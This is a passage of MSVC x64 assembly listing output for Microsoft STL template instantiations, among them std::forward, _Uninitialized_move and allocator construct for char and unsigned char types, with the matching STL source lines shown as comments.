??$move@AEA_W@std@@YA$$QEA_WAEA_W@Z ENDP		; std::move<wchar_t &>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xutility
;	COMDAT ??$_Get_unwrapped@AEBQEA_W@std@@YA?A_TAEBQEA_W@Z
_TEXT	SEGMENT
_It$ = 8
??$_Get_unwrapped@AEBQEA_W@std@@YA?A_TAEBQEA_W@Z PROC	; std::_Get_unwrapped<wchar_t * const &>, COMDAT

; 1347 : _NODISCARD constexpr decltype(auto) _Get_unwrapped(_Iter&& _It) {

	mov	QWORD PTR [rsp+8], rcx

; 1348 :     // unwrap an iterator previously subjected to _Adl_verify_range or otherwise validated
; 1349 :     if constexpr (is_pointer_v<decay_t<_Iter>>) { // special-case pointers and arrays
; 1350 :         return _It + 0;

	mov	rax, QWORD PTR _It$[rsp]
	mov	rax, QWORD PTR [rax]

; 1351 :     } else if constexpr (_Unwrappable_v<_Iter>) {
; 1352 :         return static_cast<_Iter&&>(_It)._Unwrapped();
; 1353 :     } else {
; 1354 :         return static_cast<_Iter&&>(_It);
; 1355 :     }
; 1356 : }

	ret	0
??$_Get_unwrapped@AEBQEA_W@std@@YA?A_TAEBQEA_W@Z ENDP	; std::_Get_unwrapped<wchar_t * const &>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xutility
;	COMDAT ??$_Voidify_iter@PEA_W@std@@YAPEAXPEA_W@Z
_TEXT	SEGMENT
_It$ = 8
??$_Voidify_iter@PEA_W@std@@YAPEAXPEA_W@Z PROC		; std::_Voidify_iter<wchar_t *>, COMDAT

; 212  : _NODISCARD constexpr void* _Voidify_iter(_Iter _It) noexcept {

	mov	QWORD PTR [rsp+8], rcx

; 213  :     if constexpr (is_pointer_v<_Iter>) {
; 214  :         return const_cast<void*>(static_cast<const volatile void*>(_It));

	mov	rax, QWORD PTR _It$[rsp]

; 215  :     } else {
; 216  :         return const_cast<void*>(static_cast<const volatile void*>(_STD addressof(*_It)));
; 217  :     }
; 218  : }

	ret	0
??$_Voidify_iter@PEA_W@std@@YAPEAXPEA_W@Z ENDP		; std::_Voidify_iter<wchar_t *>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstddef
;	COMDAT ??$addressof@_W@std@@YAPEA_WAEA_W@Z
_TEXT	SEGMENT
_Val$ = 8
??$addressof@_W@std@@YAPEA_WAEA_W@Z PROC		; std::addressof<wchar_t>, COMDAT

; 252  : _NODISCARD constexpr _Ty* addressof(_Ty& _Val) noexcept {

	mov	QWORD PTR [rsp+8], rcx

; 253  :     return __builtin_addressof(_Val);

	mov	rax, QWORD PTR _Val$[rsp]

; 254  : }

	ret	0
??$addressof@_W@std@@YAPEA_WAEA_W@Z ENDP		; std::addressof<wchar_t>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\type_traits
;	COMDAT ??$forward@AEAPEAV_Facet_base@std@@@std@@YAAEAPEAV_Facet_base@0@AEAPEAV10@@Z
_TEXT	SEGMENT
_Arg$ = 8
??$forward@AEAPEAV_Facet_base@std@@@std@@YAAEAPEAV_Facet_base@0@AEAPEAV10@@Z PROC ; std::forward<std::_Facet_base * &>, COMDAT

; 1411 :     remove_reference_t<_Ty>& _Arg) noexcept { // forward an lvalue as either an lvalue or an rvalue

	mov	QWORD PTR [rsp+8], rcx

; 1412 :     return static_cast<_Ty&&>(_Arg);

	mov	rax, QWORD PTR _Arg$[rsp]

; 1413 : }

	ret	0
??$forward@AEAPEAV_Facet_base@std@@@std@@YAAEAPEAV_Facet_base@0@AEAPEAV10@@Z ENDP ; std::forward<std::_Facet_base * &>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xmemory
;	COMDAT ??$_Allocate_manually_vector_aligned@U_Default_allocate_traits@std@@@std@@YAPEAX_K@Z
_TEXT	SEGMENT
_Ptr_container$ = 32
_Block_size$ = 40
_Ptr$ = 48
_Bytes$ = 80
??$_Allocate_manually_vector_aligned@U_Default_allocate_traits@std@@@std@@YAPEAX_K@Z PROC ; std::_Allocate_manually_vector_aligned<std::_Default_allocate_traits>, COMDAT

; 129  : __declspec(allocator) void* _Allocate_manually_vector_aligned(const size_t _Bytes) {

$LN12:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 72					; 00000048H

; 130  :     // allocate _Bytes manually aligned to at least _Big_allocation_alignment
; 131  :     const size_t _Block_size = _Non_user_size + _Bytes;

	mov	rax, QWORD PTR _Bytes$[rsp]
	add	rax, 39					; 00000027H
	mov	QWORD PTR _Block_size$[rsp], rax

; 132  :     if (_Block_size <= _Bytes) {

	mov	rax, QWORD PTR _Bytes$[rsp]
	cmp	QWORD PTR _Block_size$[rsp], rax
	ja	SHORT $LN8@Allocate_m

; 133  :         _Throw_bad_array_new_length(); // add overflow

	call	?_Throw_bad_array_new_length@std@@YAXXZ	; std::_Throw_bad_array_new_length
$LN8@Allocate_m:

; 134  :     }
; 135  : 
; 136  :     const uintptr_t _Ptr_container = reinterpret_cast<uintptr_t>(_Traits::_Allocate(_Block_size));

	mov	rcx, QWORD PTR _Block_size$[rsp]
	call	?_Allocate@_Default_allocate_traits@std@@SAPEAX_K@Z ; std::_Default_allocate_traits::_Allocate
	mov	QWORD PTR _Ptr_container$[rsp], rax
$LN4@Allocate_m:

; 137  :     _STL_VERIFY(_Ptr_container != 0, "invalid argument"); // validate even in release since we're doing p[-1]

	cmp	QWORD PTR _Ptr_container$[rsp], 0
	je	SHORT $LN9@Allocate_m
	jmp	SHORT $LN10@Allocate_m
$LN9@Allocate_m:
$LN7@Allocate_m:
	call	_invalid_parameter_noinfo_noreturn
	xor	eax, eax
	test	eax, eax
	jne	SHORT $LN7@Allocate_m
$LN10@Allocate_m:
	xor	eax, eax
	test	eax, eax
	jne	SHORT $LN4@Allocate_m

; 138  :     void* const _Ptr = reinterpret_cast<void*>((_Ptr_container + _Non_user_size) & ~(_Big_allocation_alignment - 1));

	mov	rax, QWORD PTR _Ptr_container$[rsp]
	add	rax, 39					; 00000027H
	and	rax, -32				; ffffffffffffffe0H
	mov	QWORD PTR _Ptr$[rsp], rax

; 139  :     static_cast<uintptr_t*>(_Ptr)[-1] = _Ptr_container;

	mov	eax, 8
	imul	rax, rax, -1
	mov	rcx, QWORD PTR _Ptr$[rsp]
	mov	rdx, QWORD PTR _Ptr_container$[rsp]
	mov	QWORD PTR [rcx+rax], rdx

; 140  : 
; 141  : #ifdef _DEBUG
; 142  :     static_cast<uintptr_t*>(_Ptr)[-2] = _Big_allocation_sentinel;
; 143  : #endif // _DEBUG
; 144  :     return _Ptr;

	mov	rax, QWORD PTR _Ptr$[rsp]
$LN11@Allocate_m:

; 145  : }

	add	rsp, 72					; 00000048H
	ret	0
??$_Allocate_manually_vector_aligned@U_Default_allocate_traits@std@@@std@@YAPEAX_K@Z ENDP ; std::_Allocate_manually_vector_aligned<std::_Default_allocate_traits>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\type_traits
;	COMDAT ??$forward@AEBQEAD@std@@YAAEBQEADAEBQEAD@Z
_TEXT	SEGMENT
_Arg$ = 8
??$forward@AEBQEAD@std@@YAAEBQEADAEBQEAD@Z PROC		; std::forward<char * const &>, COMDAT

; 1411 :     remove_reference_t<_Ty>& _Arg) noexcept { // forward an lvalue as either an lvalue or an rvalue

	mov	QWORD PTR [rsp+8], rcx

; 1412 :     return static_cast<_Ty&&>(_Arg);

	mov	rax, QWORD PTR _Arg$[rsp]

; 1413 : }

	ret	0
??$forward@AEBQEAD@std@@YAAEBQEADAEBQEAD@Z ENDP		; std::forward<char * const &>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\type_traits
;	COMDAT ??$forward@AEBQEA_W@std@@YAAEBQEA_WAEBQEA_W@Z
_TEXT	SEGMENT
_Arg$ = 8
??$forward@AEBQEA_W@std@@YAAEBQEA_WAEBQEA_W@Z PROC	; std::forward<wchar_t * const &>, COMDAT

; 1411 :     remove_reference_t<_Ty>& _Arg) noexcept { // forward an lvalue as either an lvalue or an rvalue

	mov	QWORD PTR [rsp+8], rcx

; 1412 :     return static_cast<_Ty&&>(_Arg);

	mov	rax, QWORD PTR _Arg$[rsp]

; 1413 : }

	ret	0
??$forward@AEBQEA_W@std@@YAAEBQEA_WAEBQEA_W@Z ENDP	; std::forward<wchar_t * const &>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xmemory
;	COMDAT ??$_Uninitialized_move@PEADV?$allocator@D@std@@@std@@YAPEADQEAD0PEADAEAV?$allocator@D@0@@Z
_TEXT	SEGMENT
_UFirst$ = 32
_ULast$ = 40
$T1 = 48
_Backout$ = 56
_First$ = 96
_Last$ = 104
_Dest$ = 112
_Al$ = 120
??$_Uninitialized_move@PEADV?$allocator@D@std@@@std@@YAPEADQEAD0PEADAEAV?$allocator@D@0@@Z PROC ; std::_Uninitialized_move<char *,std::allocator<char> >, COMDAT

; 1740 :     const _InIt _First, const _InIt _Last, _Alloc_ptr_t<_Alloc> _Dest, _Alloc& _Al) {

$LN7:
	mov	QWORD PTR [rsp+32], r9
	mov	QWORD PTR [rsp+24], r8
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 88					; 00000058H

; 1741 :     // move [_First, _Last) to raw _Dest, using _Al
; 1742 :     // note: only called internally from elsewhere in the STL
; 1743 :     using _Ptrval     = typename _Alloc::value_type*;
; 1744 :     auto _UFirst      = _Get_unwrapped(_First);

	lea	rcx, QWORD PTR _First$[rsp]
	call	??$_Get_unwrapped@AEBQEAD@std@@YA?A_TAEBQEAD@Z ; std::_Get_unwrapped<char * const &>
	mov	QWORD PTR _UFirst$[rsp], rax

; 1745 :     const auto _ULast = _Get_unwrapped(_Last);

	lea	rcx, QWORD PTR _Last$[rsp]
	call	??$_Get_unwrapped@AEBQEAD@std@@YA?A_TAEBQEAD@Z ; std::_Get_unwrapped<char * const &>
	mov	QWORD PTR _ULast$[rsp], rax

; 1746 :     if constexpr (conjunction_v<bool_constant<_Iter_move_cat<decltype(_UFirst), _Ptrval>::_Bitcopy_constructible>,
; 1747 :                       _Uses_default_construct<_Alloc, _Ptrval, decltype(_STD move(*_UFirst))>>) {
; 1748 : #if _HAS_CXX20
; 1749 :         if (!_STD is_constant_evaluated())
; 1750 : #endif // _HAS_CXX20
; 1751 :         {
; 1752 :             _Copy_memmove(_UFirst, _ULast, _Unfancy(_Dest));

	mov	rcx, QWORD PTR _Dest$[rsp]
	call	??$_Unfancy@D@std@@YAPEADPEAD@Z		; std::_Unfancy<char>
	mov	r8, rax
	mov	rdx, QWORD PTR _ULast$[rsp]
	mov	rcx, QWORD PTR _UFirst$[rsp]
	call	??$_Copy_memmove@PEADPEAD@std@@YAPEADPEAD00@Z ; std::_Copy_memmove<char *,char *>

; 1753 :             return _Dest + (_ULast - _UFirst);

	mov	rax, QWORD PTR _UFirst$[rsp]
	mov	rcx, QWORD PTR _ULast$[rsp]
	sub	rcx, rax
	mov	rax, rcx
	mov	rcx, QWORD PTR _Dest$[rsp]
	add	rcx, rax
	mov	rax, rcx
	jmp	SHORT $LN1@Uninitiali

; 1754 :         }
; 1755 :     }
; 1756 : 
; 1757 :     _Uninitialized_backout_al<_Alloc> _Backout{_Dest, _Al};

	mov	r8, QWORD PTR _Al$[rsp]
	mov	rdx, QWORD PTR _Dest$[rsp]
	lea	rcx, QWORD PTR _Backout$[rsp]
	call	??0?$_Uninitialized_backout_al@V?$allocator@D@std@@@std@@QEAA@PEADAEAV?$allocator@D@1@@Z ; std::_Uninitialized_backout_al<std::allocator<char> >::_Uninitialized_backout_al<std::allocator<char> >

; 1758 :     for (; _UFirst != _ULast; ++_UFirst) {

	jmp	SHORT $LN4@Uninitiali
$LN2@Uninitiali:
	mov	rax, QWORD PTR _UFirst$[rsp]
	inc	rax
	mov	QWORD PTR _UFirst$[rsp], rax
$LN4@Uninitiali:
	mov	rax, QWORD PTR _ULast$[rsp]
	cmp	QWORD PTR _UFirst$[rsp], rax
	je	SHORT $LN3@Uninitiali

; 1759 :         _Backout._Emplace_back(_STD move(*_UFirst));

	mov	rcx, QWORD PTR _UFirst$[rsp]
	call	??$move@AEAD@std@@YA$$QEADAEAD@Z	; std::move<char &>
	mov	rdx, rax
	lea	rcx, QWORD PTR _Backout$[rsp]
	call	??$_Emplace_back@D@?$_Uninitialized_backout_al@V?$allocator@D@std@@@std@@QEAAX$$QEAD@Z ; std::_Uninitialized_backout_al<std::allocator<char> >::_Emplace_back<char>

; 1760 :     }

	jmp	SHORT $LN2@Uninitiali
$LN3@Uninitiali:

; 1761 : 
; 1762 :     return _Backout._Release();

	lea	rcx, QWORD PTR _Backout$[rsp]
	call	?_Release@?$_Uninitialized_backout_al@V?$allocator@D@std@@@std@@QEAAPEADXZ ; std::_Uninitialized_backout_al<std::allocator<char> >::_Release
	mov	QWORD PTR $T1[rsp], rax
	lea	rcx, QWORD PTR _Backout$[rsp]
	call	??1?$_Uninitialized_backout_al@V?$allocator@D@std@@@std@@QEAA@XZ ; std::_Uninitialized_backout_al<std::allocator<char> >::~_Uninitialized_backout_al<std::allocator<char> >
	mov	rax, QWORD PTR $T1[rsp]
$LN1@Uninitiali:

; 1763 : }

	add	rsp, 88					; 00000058H
	ret	0
??$_Uninitialized_move@PEADV?$allocator@D@std@@@std@@YAPEADQEAD0PEADAEAV?$allocator@D@0@@Z ENDP ; std::_Uninitialized_move<char *,std::allocator<char> >
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT text$x
text$x	SEGMENT
_UFirst$ = 32
_ULast$ = 40
$T1 = 48
_Backout$ = 56
_First$ = 96
_Last$ = 104
_Dest$ = 112
_Al$ = 120
?dtor$0@?0???$_Uninitialized_move@PEADV?$allocator@D@std@@@std@@YAPEADQEAD0PEADAEAV?$allocator@D@0@@Z@4HA PROC ; `std::_Uninitialized_move<char *,std::allocator<char> >'::`1'::dtor$0
	push	rbp
	sub	rsp, 32					; 00000020H
	mov	rbp, rdx
	lea	rcx, QWORD PTR _Backout$[rbp]
	call	??1?$_Uninitialized_backout_al@V?$allocator@D@std@@@std@@QEAA@XZ ; std::_Uninitialized_backout_al<std::allocator<char> >::~_Uninitialized_backout_al<std::allocator<char> >
	add	rsp, 32					; 00000020H
	pop	rbp
	ret	0
?dtor$0@?0???$_Uninitialized_move@PEADV?$allocator@D@std@@@std@@YAPEADQEAD0PEADAEAV?$allocator@D@0@@Z@4HA ENDP ; `std::_Uninitialized_move<char *,std::allocator<char> >'::`1'::dtor$0
text$x	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xmemory
;	COMDAT ??$construct@DAEBD@?$_Default_allocator_traits@V?$allocator@D@std@@@std@@SAXAEAV?$allocator@D@1@QEADAEBD@Z
_TEXT	SEGMENT
$T1 = 32
__formal$ = 64
_Ptr$ = 72
<_Args_0>$ = 80
??$construct@DAEBD@?$_Default_allocator_traits@V?$allocator@D@std@@@std@@SAXAEAV?$allocator@D@1@QEADAEBD@Z PROC ; std::_Default_allocator_traits<std::allocator<char> >::construct<char,char const &>, COMDAT

; 675  :     static _CONSTEXPR20 void construct(_Alloc&, _Objty* const _Ptr, _Types&&... _Args) {

$LN3:
	mov	QWORD PTR [rsp+24], r8
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 56					; 00000038H

; 676  : #if _HAS_CXX20
; 677  :         if (_STD is_constant_evaluated()) {
; 678  :             _STD construct_at(_Ptr, _STD forward<_Types>(_Args)...);
; 679  :         } else
; 680  : #endif // _HAS_CXX20
; 681  :         {
; 682  :             ::new (_Voidify_iter(_Ptr)) _Objty(_STD forward<_Types>(_Args)...);

	mov	rcx, QWORD PTR _Ptr$[rsp]
	call	??$_Voidify_iter@PEAD@std@@YAPEAXPEAD@Z	; std::_Voidify_iter<char *>
	mov	rdx, rax
	mov	ecx, 1
	call	??2@YAPEAX_KPEAX@Z			; operator new
	mov	QWORD PTR $T1[rsp], rax
	mov	rcx, QWORD PTR <_Args_0>$[rsp]
	call	??$forward@AEBD@std@@YAAEBDAEBD@Z	; std::forward<char const &>
	mov	rcx, QWORD PTR $T1[rsp]
	movzx	eax, BYTE PTR [rax]
	mov	BYTE PTR [rcx], al

; 683  :         }
; 684  :     }

	add	rsp, 56					; 00000038H
	ret	0
??$construct@DAEBD@?$_Default_allocator_traits@V?$allocator@D@std@@@std@@SAXAEAV?$allocator@D@1@QEADAEBD@Z ENDP ; std::_Default_allocator_traits<std::allocator<char> >::construct<char,char const &>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xutility
;	COMDAT ??$_Construct_in_place@DAEBD@std@@YAXAEADAEBD@Z
_TEXT	SEGMENT
$T1 = 32
_Obj$ = 64
<_Args_0>$ = 72
??$_Construct_in_place@DAEBD@std@@YAXAEADAEBD@Z PROC	; std::_Construct_in_place<char,char const &>, COMDAT

; 231  :     is_nothrow_constructible_v<_Ty, _Types...>) {

$LN3:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 56					; 00000038H

; 232  : #if _HAS_CXX20
; 233  :     if (_STD is_constant_evaluated()) {
; 234  :         _STD construct_at(_STD addressof(_Obj), _STD forward<_Types>(_Args)...);
; 235  :     } else
; 236  : #endif // _HAS_CXX20
; 237  :     {
; 238  :         ::new (_Voidify_iter(_STD addressof(_Obj))) _Ty(_STD forward<_Types>(_Args)...);

	mov	rcx, QWORD PTR _Obj$[rsp]
	call	??$addressof@D@std@@YAPEADAEAD@Z	; std::addressof<char>
	mov	rcx, rax
	call	??$_Voidify_iter@PEAD@std@@YAPEAXPEAD@Z	; std::_Voidify_iter<char *>
	mov	rdx, rax
	mov	ecx, 1
	call	??2@YAPEAX_KPEAX@Z			; operator new
	mov	QWORD PTR $T1[rsp], rax
	mov	rcx, QWORD PTR <_Args_0>$[rsp]
	call	??$forward@AEBD@std@@YAAEBDAEBD@Z	; std::forward<char const &>
	mov	rcx, QWORD PTR $T1[rsp]
	movzx	eax, BYTE PTR [rax]
	mov	BYTE PTR [rcx], al

; 239  :     }
; 240  : }

	add	rsp, 56					; 00000038H
	ret	0
??$_Construct_in_place@DAEBD@std@@YAXAEADAEBD@Z ENDP	; std::_Construct_in_place<char,char const &>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xmemory
;	COMDAT ??$_Uninitialized_move@PEAEV?$allocator@E@std@@@std@@YAPEAEQEAE0PEAEAEAV?$allocator@E@0@@Z
_TEXT	SEGMENT
_UFirst$ = 32
_ULast$ = 40
$T1 = 48
_Backout$ = 56
_First$ = 96
_Last$ = 104
_Dest$ = 112
_Al$ = 120
??$_Uninitialized_move@PEAEV?$allocator@E@std@@@std@@YAPEAEQEAE0PEAEAEAV?$allocator@E@0@@Z PROC ; std::_Uninitialized_move<unsigned char *,std::allocator<unsigned char> >, COMDAT

; 1740 :     const _InIt _First, const _InIt _Last, _Alloc_ptr_t<_Alloc> _Dest, _Alloc& _Al) {

$LN7:
	mov	QWORD PTR [rsp+32], r9
	mov	QWORD PTR [rsp+24], r8
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 88					; 00000058H

; 1741 :     // move [_First, _Last) to raw _Dest, using _Al
; 1742 :     // note: only called internally from elsewhere in the STL
; 1743 :     using _Ptrval     = typename _Alloc::value_type*;
; 1744 :     auto _UFirst      = _Get_unwrapped(_First);

	lea	rcx, QWORD PTR _First$[rsp]
	call	??$_Get_unwrapped@AEBQEAE@std@@YA?A_TAEBQEAE@Z ; std::_Get_unwrapped<unsigned char * const &>
	mov	QWORD PTR _UFirst$[rsp], rax

; 1745 :     const auto _ULast = _Get_unwrapped(_Last);

	lea	rcx, QWORD PTR _Last$[rsp]
	call	??$_Get_unwrapped@AEBQEAE@std@@YA?A_TAEBQEAE@Z ; std::_Get_unwrapped<unsigned char * const &>
	mov	QWORD PTR _ULast$[rsp], rax

; 1746 :     if constexpr (conjunction_v<bool_constant<_Iter_move_cat<decltype(_UFirst), _Ptrval>::_Bitcopy_constructible>,
; 1747 :                       _Uses_default_construct<_Alloc, _Ptrval, decltype(_STD move(*_UFirst))>>) {
; 1748 : #if _HAS_CXX20
; 1749 :         if (!_STD is_constant_evaluated())
; 1750 : #endif // _HAS_CXX20
; 1751 :         {
; 1752 :             _Copy_memmove(_UFirst, _ULast, _Unfancy(_Dest));

	mov	rcx, QWORD PTR _Dest$[rsp]
	call	??$_Unfancy@E@std@@YAPEAEPEAE@Z		; std::_Unfancy<unsigned char>
	mov	r8, rax
	mov	rdx, QWORD PTR _ULast$[rsp]
	mov	rcx, QWORD PTR _UFirst$[rsp]
	call	??$_Copy_memmove@PEAEPEAE@std@@YAPEAEPEAE00@Z ; std::_Copy_memmove<unsigned char *,unsigned char *>

; 1753 :             return _Dest + (_ULast - _UFirst);

	mov	rax, QWORD PTR _UFirst$[rsp]
	mov	rcx, QWORD PTR _ULast$[rsp]
	sub	rcx, rax
	mov	rax, rcx
	mov	rcx, QWORD PTR _Dest$[rsp]
	add	rcx, rax
	mov	rax, rcx
	jmp	SHORT $LN1@Uninitiali

; 1754 :         }
; 1755 :     }
; 1756 : 
; 1757 :     _Uninitialized_backout_al<_Alloc> _Backout{_Dest, _Al};

	mov	r8, QWORD PTR _Al$[rsp]
	mov	rdx, QWORD PTR _Dest$[rsp]
	lea	rcx, QWORD PTR _Backout$[rsp]
	call	??0?$_Uninitialized_backout_al@V?$allocator@E@std@@@std@@QEAA@PEAEAEAV?$allocator@E@1@@Z ; std::_Uninitialized_backout_al<std::allocator<unsigned char> >::_Uninitialized_backout_al<std::allocator<unsigned char> >

; 1758 :     for (; _UFirst != _ULast; ++_UFirst) {

	jmp	SHORT $LN4@Uninitiali
$LN2@Uninitiali:
	mov	rax, QWORD PTR _UFirst$[rsp]
	inc	rax
	mov	QWORD PTR _UFirst$[rsp], rax
$LN4@Uninitiali:
	mov	rax, QWORD PTR _ULast$[rsp]
	cmp	QWORD PTR _UFirst$[rsp], rax
	je	SHORT $LN3@Uninitiali

; 1759 :         _Backout._Emplace_back(_STD move(*_UFirst));

	mov	rcx, QWORD PTR _UFirst$[rsp]
	call	??$move@AEAE@std@@YA$$QEAEAEAE@Z	; std::move<unsigned char &>
	mov	rdx, rax
	lea	rcx, QWORD PTR _Backout$[rsp]
	call	??$_Emplace_back@E@?$_Uninitialized_backout_al@V?$allocator@E@std@@@std@@QEAAX$$QEAE@Z ; std::_Uninitialized_backout_al<std::allocator<unsigned char> >::_Emplace_back<unsigned char>

; 1760 :     }

	jmp	SHORT $LN2@Uninitiali
$LN3@Uninitiali:

; 1761 : 
; 1762 :     return _Backout._Release();

	lea	rcx, QWORD PTR _Backout$[rsp]
	call	?_Release@?$_Uninitialized_backout_al@V?$allocator@E@std@@@std@@QEAAPEAEXZ ; std::_Uninitialized_backout_al<std::allocator<unsigned char> >::_Release
	mov	QWORD PTR $T1[rsp], rax
	lea	rcx, QWORD PTR _Backout$[rsp]
	call	??1?$_Uninitialized_backout_al@V?$allocator@E@std@@@std@@QEAA@XZ ; std::_Uninitialized_backout_al<std::allocator<unsigned char> >::~_Uninitialized_backout_al<std::allocator<unsigned char> >
	mov	rax, QWORD PTR $T1[rsp]
$LN1@Uninitiali:

; 1763 : }

	add	rsp, 88					; 00000058H
	ret	0
??$_Uninitialized_move@PEAEV?$allocator@E@std@@@std@@YAPEAEQEAE0PEAEAEAV?$allocator@E@0@@Z ENDP ; std::_Uninitialized_move<unsigned char *,std::allocator<unsigned char> >
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT text$x
text$x	SEGMENT
_UFirst$ = 32
_ULast$ = 40
$T1 = 48
_Backout$ = 56
_First$ = 96
_Last$ = 104
_Dest$ = 112
_Al$ = 120
?dtor$0@?0???$_Uninitialized_move@PEAEV?$allocator@E@std@@@std@@YAPEAEQEAE0PEAEAEAV?$allocator@E@0@@Z@4HA PROC ; `std::_Uninitialized_move<unsigned char *,std::allocator<unsigned char> >'::`1'::dtor$0
	push	rbp
	sub	rsp, 32					; 00000020H
	mov	rbp, rdx
	lea	rcx, QWORD PTR _Backout$[rbp]
	call	??1?$_Uninitialized_backout_al@V?$allocator@E@std@@@std@@QEAA@XZ ; std::_Uninitialized_backout_al<std::allocator<unsigned char> >::~_Uninitialized_backout_al<std::allocator<unsigned char> >
	add	rsp, 32					; 00000020H
	pop	rbp
	ret	0
?dtor$0@?0???$_Uninitialized_move@PEAEV?$allocator@E@std@@@std@@YAPEAEQEAE0PEAEAEAV?$allocator@E@0@@Z@4HA ENDP ; `std::_Uninitialized_move<unsigned char *,std::allocator<unsigned char> >'::`1'::dtor$0
text$x	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xmemory
;	COMDAT ??$construct@EAEBE@?$_Default_allocator_traits@V?$allocator@E@std@@@std@@SAXAEAV?$allocator@E@1@QEAEAEBE@Z
_TEXT	SEGMENT
$T1 = 32
__formal$ = 64
_Ptr$ = 72
<_Args_0>$ = 80
??$construct@EAEBE@?$_Default_allocator_traits@V?$allocator@E@std@@@std@@SAXAEAV?$allocator@E@1@QEAEAEBE@Z PROC ; std::_Default_allocator_traits<std::allocator<unsigned char> >::construct<unsigned char,unsigned char const &>, COMDAT

; 675  :     static _CONSTEXPR20 void construct(_Alloc&, _Objty* const _Ptr, _Types&&... _Args) {

$LN3:
	mov	QWORD PTR [rsp+24], r8
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 56					; 00000038H

; 676  : #if _HAS_CXX20
; 677  :         if (_STD is_constant_evaluated()) {
; 678  :             _STD construct_at(_Ptr, _STD forward<_Types>(_Args)...);
; 679  :         } else
; 680  : #endif // _HAS_CXX20
; 681  :         {
; 682  :             ::new (_Voidify_iter(_Ptr)) _Objty(_STD forward<_Types>(_Args)...);

	mov	rcx, QWORD PTR _Ptr$[rsp]
	call	??$_Voidify_iter@PEAE@std@@YAPEAXPEAE@Z	; std::_Voidify_iter<unsigned char *>
	mov	rdx, rax
	mov	ecx, 1
	call	??2@YAPEAX_KPEAX@Z			; operator new
	mov	QWORD PTR $T1[rsp], rax
	mov	rcx, QWORD PTR <_Args_0>$[rsp]
	call	??$forward@AEBE@std@@YAAEBEAEBE@Z	; std::forward<unsigned char const &>
	mov	rcx, QWORD PTR $T1[rsp]
	movzx	eax, BYTE PTR [rax]
	mov	BYTE PTR [rcx], al

; 683  :         }
; 684  :     }

	add	rsp, 56					; 00000038H
	ret	0
??$construct@EAEBE@?$_Default_allocator_traits@V?$allocator@E@std@@@std@@SAXAEAV?$allocator@E@1@QEAEAEBE@Z ENDP ; std::_Default_allocator_traits<std::allocator<unsigned char> >::construct<unsigned char,unsigned char const &>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstddef
;	COMDAT ??$_Unfancy@E@std@@YAPEAEPEAE@Z
_TEXT	SEGMENT
_Ptr$ = 8
??$_Unfancy@E@std@@YAPEAEPEAE@Z PROC			; std::_Unfancy<unsigned char>, COMDAT

; 265  : _NODISCARD constexpr _Ty* _Unfancy(_Ty* _Ptr) noexcept { // do nothing for plain pointers

	mov	QWORD PTR [rsp+8], rcx

; 266  :     return _Ptr;

	mov	rax, QWORD PTR _Ptr$[rsp]

; 267  : }

	ret	0
??$_Unfancy@E@std@@YAPEAEPEAE@Z ENDP			; std::_Unfancy<unsigned char>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xutility
;	COMDAT ??$_Construct_in_place@EAEBE@std@@YAXAEAEAEBE@Z
_TEXT	SEGMENT
$T1 = 32
_Obj$ = 64
<_Args_0>$ = 72
??$_Construct_in_place@EAEBE@std@@YAXAEAEAEBE@Z PROC	; std::_Construct_in_place<unsigned char,unsigned char const &>, COMDAT

; 231  :     is_nothrow_constructible_v<_Ty, _Types...>) {

$LN3:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 56					; 00000038H

; 232  : #if _HAS_CXX20
; 233  :     if (_STD is_constant_evaluated()) {
; 234  :         _STD construct_at(_STD addressof(_Obj), _STD forward<_Types>(_Args)...);
; 235  :     } else
; 236  : #endif // _HAS_CXX20
; 237  :     {
; 238  :         ::new (_Voidify_iter(_STD addressof(_Obj))) _Ty(_STD forward<_Types>(_Args)...);

	mov	rcx, QWORD PTR _Obj$[rsp]
	call	??$addressof@E@std@@YAPEAEAEAE@Z	; std::addressof<unsigned char>
	mov	rcx, rax
